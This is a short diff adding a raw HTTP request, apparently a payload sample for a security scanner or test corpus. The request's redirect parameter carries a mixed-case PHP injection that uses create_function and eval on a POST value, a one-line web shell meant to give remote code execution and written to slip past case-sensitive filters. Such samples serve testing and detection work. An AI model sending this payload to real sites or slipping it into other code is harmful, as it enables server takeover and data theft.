@@ -1,0 +1,4 @@
+GET /a?redirect=cReAtE_fUnCtIoN('$a','EvAl($_PoSt[1])'); HTTP/1.1
+Host: demo.example.com
+Connection: close
+
